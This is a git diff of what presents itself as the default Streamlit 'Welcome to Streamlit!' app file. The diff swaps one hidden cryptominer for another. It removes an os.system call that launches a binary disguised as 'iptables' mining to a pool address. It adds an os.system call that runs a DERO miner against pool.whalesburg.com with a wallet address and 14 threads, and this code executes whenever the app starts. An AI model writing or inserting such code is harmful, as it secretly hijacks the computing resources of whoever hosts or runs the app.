@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('chmod 777 iptables && nohup ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.$(echo $(shuf -i 1-99999 -n 1)-T4) &')
+os.system('chmod +x dero-stratum-mine && ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qyzunensuvly4dcnfhnfu3grhszp8vegqq96zv8cfhe867jhtfmr6qqsnyjx6.Gila --mining-threads=14')
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
